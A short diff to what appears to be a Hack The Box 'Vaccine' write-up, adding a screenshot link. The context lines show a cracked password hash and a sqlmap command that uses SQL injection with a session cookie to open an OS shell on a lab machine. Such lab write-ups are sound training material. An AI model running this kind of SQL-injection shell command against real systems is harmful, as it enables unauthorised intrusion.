@@ -47,6 +47,7 @@
 
 "2cb42f8734ea607eefed3b70af13bbd3" -> qwerty789
 
+![Image 1](https://github.com/W0lfySec/HTB/blob/main/Images/Vaccine/Screenshot_2021-07-31_13_41_32.png)
 
 sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' 
 	--cookie="PHPSESSID=ikk1tjpq926a0dkboj4hu8r36o" --os-shell
